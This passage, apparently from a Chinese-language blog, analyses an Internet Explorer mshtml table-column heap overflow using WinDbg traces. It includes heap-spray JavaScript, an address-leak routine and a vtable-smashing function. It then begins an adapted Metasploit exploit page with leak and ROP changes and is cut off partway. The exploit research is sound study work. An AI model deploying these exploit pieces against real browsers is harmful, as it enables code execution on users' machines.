esi=0466e858 edi=00000000eip=673b02d5 esp=0466e528 ebp=0466e5c4 iopl=0 nv up ei pl zr na pe nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000246mshtml!CTableLayout::CalculateMinMax+0x1ba:673b02d5 3bc2 cmp eax,edx 之后下面这个函数里面是分配内存的 1234.text:74D302EC push 1Ch ; unsigned int.text:74D302EE mov eax, edx.text:74D302F0 mov edi, esi.text:74D302F2 call ?EnsureSizeWorker@CImplAry@@AAEJIJ@Z ; CImplAry::EnsureSizeWorker(uint,long) 跟进去，发现是分配0x1c*4的内存 1234567891011120:005&gt; peax=00000004 ebx=08800ea8 ecx=00000000 edx=00000001 esi=00000001 edi=08800f38eip=67478fd3 esp=0466e50c ebp=0466e51c iopl=0 nv up ei ng nz ac po cycs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000293mshtml!CImplAry::EnsureSizeWorker+0x3d:67478fd3 f76508 mul eax,dword ptr [ebp+8] ss:0023:0466e524=0000001c0:005&gt; peax=00000070 ebx=08800ea8 ecx=00000000 edx=00000000 esi=00000001 edi=08800f38eip=67478fd6 esp=0466e50c ebp=0466e51c iopl=0 nv up ei pl nz na po nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000202mshtml!CImplAry::EnsureSizeWorker+0x40:67478fd6 52 push edx 实际里面调用的是_HeapRealloc 1234567891011121314150:005&gt; peax=00000000 ebx=00000000 ecx=00000070 edx=00000000 esi=08800f44 edi=08800f38eip=67478ff6 esp=0466e508 ebp=0466e51c iopl=0 nv up ei pl zr na pe nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000246mshtml!CImplAry::EnsureSizeWorker+0x9c:67478ff6 e86edcfdff call mshtml!_HeapRealloc (67456c69)0:005&gt; dd esp0466e508 00000070 08800f38 08800ea8 000000700466e518 00000004 0466e5c4 673b02f7 0000001c0466e528 0466e824 00000000 08800ea8 70a266930466e538 00000000 00000010 672a9fd0 000000000466e548 00000000 00000000 00000000 07adbfd00466e558 00000000 00000000 00000000 70a28efa0466e568 00000000 07b504ac 0466e598 000000000466e578 08848fb8 00000000 0466e5ac 6747ba70 那我们继续跟，跟进GetAAspan，返回值为000003e8，即10进制的1000，也即trigger函数里面将span设置成了1000 1234560:005&gt; peax=00000001 ebx=08800ea8 ecx=00000002 edx=0879dff0 esi=672abde0 edi=087a0fd0eip=6733a01e esp=0466dd30 ebp=0466dd38 iopl=0 nv up ei pl nz na po nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000202mshtml!CTableCol::GetAAspan+0x17:6733a01e 8b45fc mov eax,dword ptr [ebp-4] ss:0023:0466dd34=000003e8 获取width的返回值有点怪 1234567891011120:005&gt; peax=08848fb8 ebx=08800ea8 ecx=07aebf80 edx=0879dff0 esi=0466e070 edi=00000001eip=67545ab3 esp=0466dd38 ebp=0466dddc iopl=0 nv up ei pl nz na po nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000202mshtml!CTableLayout::CalculateMinMax+0x454:67545ab3 e82009dbff call mshtml!CWidthUnitValue::GetPixelWidth (672f63d8)0:005&gt; peax=00414114 ebx=08800ea8 ecx=07aebf80 edx=00004141 esi=0466e070 edi=00000001eip=67545ab8 esp=0466dd40 ebp=0466dddc iopl=0 ov up ei pl nz na pe nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000a06mshtml!CTableLayout::CalculateMinMax+0x459:67545ab8 837da400 cmp dword ptr [ebp-5Ch],0 ss:0023:0466dd80=00000000 但是一算跟我们的42765有点关联，就是42765*100 12&gt;&gt;&gt; 0x004141144276500 继续，由于这次调试ecx为0，所以还没触发异常，之后还会将eax给了[ebp-24h]，这个之后会给esi 1234567891011121314151617181920212223240:005&gt; peax=000003e8 ebx=08800ea8 ecx=00000000 edx=00004141 esi=0466e070 edi=00000001eip=67545b4f esp=0466dd40 ebp=0466dddc iopl=0 nv up ei pl nz na pe nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000206mshtml!CTableLayout::CalculateMinMax+0x4f0:67545b4f 8b839c000000 mov eax,dword ptr [ebx+9Ch] ds:0023:08800f44=08a85f900:005&gt; peax=08a85f90 ebx=08800ea8 ecx=00000000 edx=00004141 esi=0466e070 edi=00000001eip=67545b55 esp=0466dd40 ebp=0466dddc iopl=0 nv up ei pl nz na pe nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000206mshtml!CTableLayout::CalculateMinMax+0x4f6:67545b55 03c1 add eax,ecx0:005&gt; peax=08a85f90 ebx=08800ea8 ecx=00000000 edx=00004141 esi=0466e070 edi=00000001eip=67545b57 esp=0466dd40 ebp=0466dddc iopl=0 nv up ei pl nz na pe nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000206mshtml!CTableLayout::CalculateMinMax+0x4f8:67545b57 837de400 cmp dword ptr [ebp-1Ch],0 ss:0023:0466ddc0=000000000:005&gt; peax=08a85f90 ebx=08800ea8 ecx=00000000 edx=00004141 esi=0466e070 edi=00000001eip=67545b5b esp=0466dd40 ebp=0466dddc iopl=0 nv up ei pl zr na pe nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000246mshtml!CTableLayout::CalculateMinMax+0x4fc:67545b5b 8945dc mov dword ptr [ebp-24h],eax ss:0023:0466ddb8=08a85fac 可以看到确实是的 12367545b83 8b75dc mov esi,dword ptr [ebp-24h]67545b86 ff75f4 push dword ptr [ebp-0Ch]67545b89 e8c4951800 call mshtml!CTableColCalc::AdjustForCol (676cf152) 第一次传入的esi是没什么问题的，看到+0x18也是没问题的 从调试结果看esi每次递增0x1c，而且第一次的时候不会递增 ida看到，这确实好似每次都会递增0x1c，即10进制的28 而控制循环次数的就是在这一句 12if ( (signed int)v154 &gt;= v161 ) break; 因为v154在循环外初始化为0，所以核心应该是v161 我们向上寻找161的来源，是CTableCell::GetAAcolSpan或者上面那个，看名字就猜到是获取clo的span值的，而且最大是1000，我们看看调试是哪个， 调试发现是调用GetAAspan（第一处），返回值为1，跟poc符合 12345678910111213140:013&gt; gModLoad: 69430000 694e2000 C:\\Windows\\System32\\jscript.dllBreakpoint 1 hiteax=04f1bfd0 ebx=088d5ea8 ecx=00000033 edx=00000000 esi=086ecfac edi=04f1bfd0eip=66f45a2e esp=0458e228 ebp=0458e2c4 iopl=0 nv up ei pl zr na pe nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000246mshtml!CTableLayout::CalculateMinMax+0x37e:66f45a2e e8d445dfff call mshtml!CTableCol::GetAAspan (66d3a007)0:005&gt; peax=00000001 ebx=088d5ea8 ecx=00000002 edx=07e4bff0 esi=086ecfac edi=04f1bfd0eip=66f45a33 esp=0458e228 ebp=0458e2c4 iopl=0 nv up ei pl nz na po nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000202mshtml!CTableLayout::CalculateMinMax+0x383:66f45a33 3de8030000 cmp eax,3E8h 第二次就返回0x38e，即1000，就是poc中将span修改为1000 123456789101112130:005&gt; gBreakpoint 1 hiteax=04f1bfd0 ebx=088d5ea8 ecx=00000033 edx=00000000 esi=086ecfac edi=04f1bfd0eip=66f45a2e esp=0458da40 ebp=0458dadc iopl=0 nv up ei pl zr na pe nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000246mshtml!CTableLayout::CalculateMinMax+0x37e:66f45a2e e8d445dfff call mshtml!CTableCol::GetAAspan (66d3a007)0:005&gt; peax=000003e8 ebx=088d5ea8 ecx=00000002 edx=07e4bff0 esi=086ecfac edi=04f1bfd0eip=66f45a33 esp=0458da40 ebp=0458dadc iopl=0 nv up ei pl nz na po nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000202mshtml!CTableLayout::CalculateMinMax+0x383:66f45a33 3de8030000 cmp eax,3E8h 而这个堆块本来分配的时候就只有0x70，我们也可以看到是在 66e78ffb mshtml!CImplAry::EnsureSizeWorker+0x000000a1分配的 12345678910111213141516171819202122232425262728293031323334353637383940414243440:005&gt; gBreakpoint 0 hiteax=08764f80 ebx=088d5ea8 ecx=00000000 edx=00004141 esi=086ecf90 edi=00000001eip=66f45b89 esp=0458da34 ebp=0458dadc iopl=0 nv up ei pl zr na pe nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000246mshtml!CTableLayout::CalculateMinMax+0x52a:66f45b89 e8c4951800 call mshtml!CTableColCalc::AdjustForCol (670cf152)0:005&gt; !heap -p -a esi address 086ecf90 found in _DPH_HEAP_ROOT @ 1151000 in busy allocation ( DPH_HEAP_BLOCK: UserAddr UserSize - VirtAddr VirtSize) 859323c: 86ecf90 70 - 86ec000 2000 6e4a8e89 verifier!AVrfDebugPageHeapAllocate+0x00000229 77514ea6 ntdll!RtlDebugAllocateHeap+0x00000030 774d7d96 ntdll!RtlpAllocateHeap+0x000000c4 774a34ca ntdll!RtlAllocateHeap+0x0000023a 66e56c94 mshtml!_HeapRealloc+0x00000036 66e78ffb mshtml!CImplAry::EnsureSizeWorker+0x000000a1 66db02f7 mshtml!CTableLayout::CalculateMinMax+0x000001df 66db0713 mshtml!CTableLayout::CalculateLayout+0x00000276 66d9af19 mshtml!CTableLayout::CalcSizeVirtual+0x00000720 66e8cc48 mshtml!CLayout::CalcSize+0x000002b8 66e7f5d0 mshtml!CFlowLayout::MeasureSite+0x00000312 66e7f31d mshtml!CFlowLayout::GetSiteWidth+0x00000156 66e7f664 mshtml!CLSMeasurer::GetSiteWidth+0x000000ce 66e7fb40 mshtml!CEmbeddedILSObj::Fmt+0x00000150 70fb665d msls31!ProcessOneRun+0x000003e9 70fb6399 msls31!FetchAppendEscCore+0x0000018e 70fb6252 msls31!LsDestroyLine+0x0000047f 70fb61c3 msls31!LsDestroyLine+0x000009ff 70fb293f msls31!LsCreateLine+0x000000cb 66e7dd81 mshtml!CLSMeasurer::LSDoCreateLine+0x00000127 66e917cc mshtml!CLSMeasurer::LSMeasure+0x00000034 66e91ef5 mshtml!CLSMeasurer::Measure+0x000001e6 66e91db1 mshtml!CLSMeasurer::MeasureLine+0x0000001c 66e911a2 mshtml!CRecalcLinePtr::MeasureLine+0x0000046d 66e933d9 mshtml!CDisplay::RecalcLinesWithMeasurer+0x00000440 66e930eb mshtml!CDisplay::RecalcLines+0x0000006b 66e93015 mshtml!CDisplay::RecalcView+0x0000006d 66e92fc8 mshtml!CFlowLayout::CalcTextSize+0x0000043d 66d9eb06 mshtml!CFlowLayout::CalcSizeCoreCompat+0x00001045 66e902ee mshtml!CFlowLayout::CalcSizeCore+0x00000049 66e90367 mshtml!CBodyLayout::CalcSizeCore+0x000000d8 66e9029c mshtml!CFlowLayout::CalcSizeVirtual+0x000001af 所以整个漏洞其实本来span为1，堆分配了0x70的大小是足够的，但是当执行时间触发器的over_trigger函数时候，将span改写为1000，导致循环次数增大，最终导致越界写到还没分配的地址（因为大小只有0x70啊），触发异常 那么从这里看width暂时没起作用，可能是漏洞利用的时候会用得，将width的赋值删掉也是能触发漏洞的 信息泄露原理分析首先是先布局，复制一下代码 1234567891011121314151617181920212223242526272829303132333435363738394041424344&lt;div id=\"test\"&gt;&lt;/div&gt;&lt;script language='javascript'&gt; var leak_index = -1;var dap = \"EEEE\";while ( dap.length &lt; 480 ) dap += dap;var padding = \"AAAA\";while ( padding.length &lt; 480 ) padding += padding;var filler = \"BBBB\";while ( filler.length &lt; 480 ) filler += filler;//sprayvar arr = new Array();var rra = new Array();var div_container = document.getElementById(\"test\");div_container.style.cssText = \"display:none\";for (var i=0; i &lt; 500; i+=2) &#123; // E rra[i] = dap.substring(0, (0x100-6)/2); // S, bstr = A arr[i] = padding.substring(0, (0x100-6)/2); // A, bstr = B arr[i+1] = filler.substring(0, (0x100-6)/2); // B var obj = document.createElement(\"button\"); div_container.appendChild(obj);&#125;for (var i=200; i&lt;500; i+=2 ) &#123; rra[i] = null; CollectGarbage();&#125;&lt;/script&gt; 首先是搞了3个480长度的字符串，之后声明了两个数组，跟着实际复制0x100大小的复制到数组里面，arr数组其中A和B是连续的，而rra中E是间隔的，之后还新建一个button对象 最后还有个循环将rra置空，，之后回收垃圾，这个相当于free吧 之后便是一堆table，col元素 为了弄清整个过程我们需要看看CollectGarbage回收的内存会不会是我们之后触发漏洞申请的内存，是的话就好办了 我们调试看看，字jscript加载的时候下断点 123456780:013&gt; sxe ld:jscript0:013&gt; gModLoad: 6c330000 6c3e2000 C:\\Windows\\System32\\jscript.dlleax=0a380000 ebx=00000000 ecx=011a1000 edx=00000000 esi=7ffda000 edi=0487e1fceip=775c64f4 esp=0487e114 ebp=0487e168 iopl=0 nv up ei pl zr na pe nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000246ntdll!KiFastSystemCallRet:775c64f4 c3 ret 之后对JsCollectGarbage下断点（其实释放内存的函数应该都会调用底层函数ntdll!RtlFreeHeap） 10:005&gt; bp jscript!JsCollectGarbage 根据作者的思路，我们先对RtlFreeHeap下断，从他的定义可以看到第3个参数就是释放的地址（可以从msdn看到） 12345BOOLEAN RtlFreeHeap( _In_ PVOID HeapHandle, _In_opt_ ULONG Flags, _In_ PVOID HeapBase); 先禁用我们的JsCollectGarbage，对RtlFreeHeap下个记录断点（注：echo后面的其实是输出字符串：free heap） 12340:005&gt; bl 0 e 6c3b8555 0001 (0001) 0:**** jscript!JsCollectGarbage0:005&gt; bd 00:005&gt; bu ntdll!RtlFreeHeap \".echo free heap;db poi(esp+c) l10;g\" 同时我们也关注漏洞位置分配的内存，我们在下面这行下断点（作者输出的是ebx+0x9c的值,这是之前调试的时候发现的值） 10:005&gt; bu CTableLayout::CalculateMinMax+0x16d &quot;.echo vulheap;dd poi(ebx+9c) l4;g&quot; 由于这个输出太多，我们输出到文件 120:005&gt; .logopen c:\\log.txtOpened log file 'c:\\log.txt' 我们查找一下vulheap字符串 vulheap03f35e68 0000054b 00450045 00450045 00450045 我们看看我们之前释放的内存有没有03f35e68，查找一下果然有 其实还有很多个这样的，因为毕竟是133个col元素 此外在poc中，将span设置为19， 12var obj_col = document.getElementById(\"132\");obj_col.span = 19; 这里作者说得不是很清楚，首先id为132的col元素的span为9 那么一开始分配的内存是9*0x1c=0xfc，这个放到0x100已经释放的内存应该是挺合适的，内存管理器就是要找到合适的内存，道理应该是这样的 我们看看vulheap到底长怎么样（下面是信息泄露完后的情形），需要重点注意的是前面还有后面的一些地方被被覆盖为04 10 00 00 即0x00001004，这个正是width*100的值 而程序的异常复制中复制的源地址是是CTreeNode::GetFancyFormat返回地址指向的值，一次复制一个dword，所以我们看到vulheap还有EE..的残留，而且复制的目标是0x18偏移，每次还再偏移0x1c 我们看看CTreeNode::GetFancyFormat的某次返回值，之后还要+0x70 12.text:74EC5A4A call ?GetFancyFormat@CTreeNode@@QAEPBVCFancyFormat@@XZ ; 某次返回值:0x02a70a20.text:74EC5A4F add eax, 70h 我们看一下复制源，是00010049 120:005&gt; dd 0x02a70a20+70 l102a70a90 00010049 那么上面的vulheap应该是00010049而不是1004啊，为什么呢 我下个断点看看 1bp mshtml!CTableLayout::CalculateMinMax+0x16d \".echo vulheap;dd poi(ebx+9c) l4;ba w4 poi(ebx+9c);g\" 也是断在AdjustForCol函数，而ebx正是0x1004 12345670:005&gt; gBreakpoint 0 hiteax=00010048 ebx=00001004 ecx=02de8040 edx=00000010 esi=02de8028 edi=02de8040eip=6600f181 esp=02429d5c ebp=02429d64 iopl=0 nv up ei pl nz na pe nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000206mshtml!CTableColCalc::AdjustForCol+0x2f:6600f181 eb2a jmp mshtml!CTableColCalc::AdjustForCol+0x5b (6600f1ad) 我们看看上一个地址是什么呢，原来是这两条语句 即下面这个位置啊，这样调试过后就很清楚了 之后我们看看over_trigger函数 123456789101112131415function over_trigger() &#123; var leak_addr = -1; for ( var i = 0; i &lt; 500; i++ ) &#123; if ( arr[i].length &gt; (0x100-6)/2 ) &#123; // overflowed leak_index = i; var leak = arr[i].substring((0x100-6)/2+(2+8)/2, (0x100-6)/2+(2+8+4)/2); leak_addr = parseInt( leak.charCodeAt(1).toString(16) + leak.charCodeAt(0).toString(16), 16 ); mshtmlbase = leak_addr - Number(0x001582b8); alert(mshtmlbase); break; &#125; &#125; if ( leak_addr == -1 || leak_index == -1 ) &#123; alert(\"memory leak failed....\"); &#125;//return mshtmlbase;&#125; 我们先来实践一下javascript对字符串的访问，可以看到，你的字符串有四个，想访问后面的地址是不可能的，返回是空字符串 根据书中信息，加上自己的调试，第一个字节表示字符串长度0xfa，而0xfa正是0x100-6 那么假如我们改变了长度的值，那么我们就可以任意向后读了，那么怎么覆盖呢，就是利用前面的span值增大了，导致循环次数增加，内存每次递增0x1c去覆盖，那么假如我们能够精准覆盖头指针那就可以了 那这里下断点就很纠结了，没灵感的时候怎么想都不行，有灵感就很好了，其实调试过程中下断点太重要了我下的断点如下，在执行将span赋值为19之前下断点 1bp mshtml!CTableColCalc::AdjustForCol+0x2a \".if(@ebx ==0x1004)&#123;.echo ------------------;db esi&#125;.else&#123;gc&#125;\" 其实暂停了好几次，下面是最后一次，我们看到BBBBB的那个字符串的前面的四个字节被改写为48 00 01 00了，这我们就有点奇怪了，为什么不是04 10 00 00 1234567891011121314150:005&gt; g------------------058e1108 41 00 41 00 41 00 41 00-41 00 41 00 41 00 00 00 A.A.A.A.A.A.A...058e1118 19 74 00 22 00 00 00 88-48 00 01 00 42 00 42 00 .t.\"....H...B.B.058e1128 42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00 B.B.B.B.B.B.B.B.058e1138 42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00 B.B.B.B.B.B.B.B.058e1148 42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00 B.B.B.B.B.B.B.B.058e1158 42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00 B.B.B.B.B.B.B.B.058e1168 42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00 B.B.B.B.B.B.B.B.058e1178 42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00 B.B.B.B.B.B.B.B.eax=00010048 ebx=00001004 ecx=058e1120 edx=00000010 esi=058e1108 edi=058e1120eip=686af17c esp=0261d804 ebp=0261d80c iopl=0 nv up ei pl nz na pe nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000206mshtml!CTableColCalc::AdjustForCol+0x2a:686af17c 895e04 mov dword ptr [esi+4],ebx ds:0023:058e110c=00410041 那我们在上面那个断点的基础上再下一个写入断点（由于多次调试位置会变化） 首先第一次断下来，我们发现正是我们之前预测的这个10049的写入，那么上面的结果为什么比这个少了1呢 123456789101112131415161718192021220:005&gt; gBreakpoint 1 hiteax=00000009 ebx=00001004 ecx=00010049 edx=00000010 esi=04660ff0 edi=04661008eip=69ebf169 esp=0256d1c8 ebp=0256d1d4 iopl=0 nv up ei pl nz na pe nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000206mshtml!CTableColCalc::AdjustForCol+0x17:69ebf169 e89eacdbff call mshtml!CUnitValue::IsScalerUnit (69c79e0c)0:005&gt; bl 0 e 69ebf17c 0001 (0001) 0:**** mshtml!CTableColCalc::AdjustForCol+0x2a \".if(@ebx ==0x1004)&#123;.echo ------------------;db esi&#125;.else&#123;gc&#125;\" 1 e 04661008 w 1 0001 (0001) 0:**** 0:005&gt; ub eipmshtml!CTableColCalc::AdjustForCol+0x7:69ebf159 53 push ebx69ebf15a 8b5d08 mov ebx,dword ptr [ebp+8]69ebf15d 57 push edi69ebf15e 8bc1 mov eax,ecx69ebf160 83e00f and eax,0Fh69ebf163 8d7e18 lea edi,[esi+18h]69ebf166 50 push eax69ebf167 890f mov dword ptr [edi],ecx0:005&gt; r ecxecx=00010049 我们再g一下 12345678910111213141516171819202122232425260:005&gt; gBreakpoint 1 hiteax=00010048 ebx=00001004 ecx=04661008 edx=00000010 esi=04660ff0 edi=04661008eip=69a9b5a3 esp=0256d1bc ebp=0256d1bc iopl=0 nv up ei pl nz na pe nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000206mshtml!CUnitValue::SetValue+0x24:69a9b5a3 5d pop ebp0:005&gt; kvChildEBP RetAddr Args to Child 0256d1bc 69ebf17c 04661008 00000008 00000001 mshtml!CUnitValue::SetValue+0x240256d1d4 69d35b8e 00001004 0256d518 00000001 mshtml!CTableColCalc::AdjustForCol+0x2a0256d284 69ba0713 00000009 0256d518 00000013 mshtml!CTableLayout::CalculateMinMax+0x52f0256d4a0 69b8af19 0256d518 0256d4e4 00000001 mshtml!CTableLayout::CalculateLayout+0x2760256d64c 69c7cc48 0256e6b0 0256d878 00000000 mshtml!CTableLayout::CalcSizeVirtual+0x720................0:005&gt; ub eipmshtml!CUnitValue::SetValue+0xc:69a9b58d 7f18 jg mshtml!CUnitValue::SetValue+0x17 (69a9b5a7)69a9b58f b9000000f8 mov ecx,0F8000000h69a9b594 3bc1 cmp eax,ecx69a9b596 7c0f jl mshtml!CUnitValue::SetValue+0x17 (69a9b5a7)69a9b598 8b4d08 mov ecx,dword ptr [ebp+8]69a9b59b c1e004 shl eax,469a9b59e 0b450c or eax,dword ptr [ebp+0Ch]69a9b5a1 8901 mov dword ptr [ecx],eax 我们看到eax正好是00010048，原来是在SetValue里面改变了，那整个过程就很清楚了，那么实际利用的是下面这里，而且a1是width相关的 我们手动运算看看，验证完成 还有其实作者的运算并不对，应该是下面的 12&gt;&gt;&gt; hex(0x1c*18 + 0x18)'0x210' 0x210是刚好，vulheap是0x100，”AAAA”是8 + 0x100 = 0x108，而”BBBB”的头部是8，所以再后面的就是BBBB的长度值，刚好位于0x210 而且i最大为18，不会19（可以看到下面的地方是等于，v154是+1之后再判断的） 那么读取的时候是怎么样的呢 1var leak = arr[i].substring((0x100-6)/2+(2+8)/2, (0x100-6)/2+(2+8+4)/2); 其实简化一下就是 1var leak = arr[i].substring((0x100-4)/2+8/2, (0x100-4)/2+(8+4)/2); 0x100-4是减去4字节的头部长度值，后面的8是CButton的堆头指针，如下图（下面为十六进制值） 我看看计算得对不对，因为偏移量可能不一样 可以看到是不对的 1230:007&gt; lmm mshtmlstart end module name66d60000 67312000 mshtml (deferred) 我们重新算一下偏移，这样才对，跟作者的也一样了 120:007&gt; ? 66ed3af8 - 66d60000 Evaluate expression: 1522424 = 00173af8 漏洞利用首先我们将偏移改回来 我们先看触发漏洞，再看堆喷射 12345function smash_vtable()&#123; var obj_col_0 = document.getElementById(\"132\"); obj_col_0.width = \"1178993\"; // smash the vftable 0x07070024 obj_col_0.span = \"44\"; // the amount to overwrite&#125; 将width设置成这么大，而且后面有个注释是vftable，应该是覆盖vftable，之后再想办法调用被覆盖的虚表里的函数 先计算一下，确实如上面注释所写的那样 12&gt;&gt;&gt; hex(1178993*100)'0x7070024' 但是作者给的exp已知断不到点子上，异常经常不一样，所以我改用msf的exp 奇怪的是msf竟然没有信息泄露代码，先直接运行 12345678910111213141516171819200:005&gt; g(db4.8a8): Access violation - code c0000005 (first chance)First chance exceptions are reported before any exception handling.This exception may be expected and handled.eax=07070024 ebx=01000000 ecx=02b80690 edx=00000041 esi=0244f088 edi=02b80b38eip=7c348b05 esp=0244eec0 ebp=0244eef8 iopl=0 nv up ei pl nz na po nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=000102027c348b05 ?? ???0:005&gt; kvChildEBP RetAddr Args to Child WARNING: Frame IP not in any known module. Following frames may be wrong.0244eebc 66f87515 0244f088 02b6ea18 66fd27d1 0x7c348b050244eec8 66fd27d1 0244f088 00000001 0244f088 mshtml!NotifyElement+0x41 (FPO: [0,0,1])0244eef8 66f88410 0244ef58 02af6bc8 0244f088 mshtml!CMarkup::BuildDescendentsList+0x2270244eff0 66f8838e 003c82c0 0244f088 003c8384 mshtml!CMarkup::NotifyDescendents+0x780244f044 66f8727c 02ae83f0 00000000 00000000 mshtml!CMarkup::SendNotification+0x920244f06c 66ee2c9f 0244f088 02b19eb0 003ca180 mshtml!CMarkup::Notify+0xd60244f148 66de04b2 02b19eb0 00000001 003aeb54 mshtml!CMarkup::SaveHistoryInternal+0x9c20244f174 66e6c0af 003ca180 02b19938 0244f1d0 mshtml!CWindow::SaveHistory+0xa90244f184 6d96ca36 003c82c0 02b19938 00000001 mshtml!CDoc::SaveHistory+0x1a 我们看看返回地址，原来调用了这里，跟作者的一样 那我们在mshtml!NotifyElement+0x35（上面的kv显示的0x41是错的）下断点发现这里是不断被调用的，根据layout这个东西，应该是实时地去调整浏览器布局，一有“风吹草动”就调整布局，比如我们通过javascript删除了某个元素，布局也要调整 12345678910111213141516171819202122232425262728290:013&gt; bp mshtml!NotifyElement+0x350:013&gt; gBreakpoint 0 hiteax=66f16ef0 ebx=01000000 ecx=002af848 edx=00000041 esi=023ef208 edi=002a56c8eip=66f87512 esp=023ef044 ebp=023ef078 iopl=0 nv up ei pl nz na po nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000202mshtml!NotifyElement+0x3e:66f87512 ff5008 call dword ptr [eax+8] ds:0023:66f16ef8=&#123;mshtml!CFlowLayout::Notify (66f87f0d)&#125;0:005&gt; gBreakpoint 0 hiteax=66dc9868 ebx=01000000 ecx=00322580 edx=00000041 esi=023ef208 edi=002c99e8eip=66f87512 esp=023ef044 ebp=023ef078 iopl=0 nv up ei pl nz na po nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000202............0:005&gt; gBreakpoint 0 hiteax=66dc9868 ebx=01000000 ecx=00332688 edx=00000041 esi=023ef208 edi=0032bcd0eip=66f87512 esp=023ef044 ebp=023ef078 iopl=0 nv up ei pl nz na po nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000202mshtml!NotifyElement+0x3e:66f87512 ff5008 call dword ptr [eax+8] ds:0023:66dc9870=&#123;mshtml!CTableLayoutBlock::Notify (66ebd6d6)&#125;0:005&gt; gBreakpoint 0 hiteax=66fbdc28 ebx=01000000 ecx=02e30db8 edx=00000041 esi=023ef208 edi=003301c0eip=66f87512 esp=023ef044 ebp=023ef078 iopl=0 nv up ei pl nz na po nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000202mshtml!NotifyElement+0x3e:66f87512 ff5008 call dword ptr [eax+8] ds:0023:66fbdc30=&#123;mshtml!CTableCellLayout::Notify (66ebd7c0)&#125; 我们看下eax的来源，是来源于ecx，而ecx指向的地址正是被覆盖成了0707002c 经过调试，发现这个虚表是在CButton的第3个dword的位置 那就是通过下面这个覆盖的 那么覆盖大小这么算呢 heap+A+B+0xC就是0x100+0x108+0x108+0xc = 0x21c,因为A，B字符串有堆头的8个字节 其实之前的span为19足够覆盖的了 12&gt;&gt;&gt; hex(0x1c*19)'0x214' 覆盖+8的位置就是，刚好 10x214+8 = 0x21c 那整个过程就清楚了，但好像19触发不了，应该值没变不会进入那个流程，应该44确保可以触发那个流程吧 我对msf的代码添加了信息泄露，同时修改了rop（这个重新自己用mona生成后根据泄露的基址调整的） 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145&lt;html&gt;&lt;body&gt;&lt;div id=\"bUYP\"&gt;&lt;/div&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"0\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"1\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"2\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"3\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"4\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"5\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"6\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"7\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"8\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"9\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"10\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"11\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"12\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"13\" width=\"41\" span=\"9\" &gt;&amp;nbsp 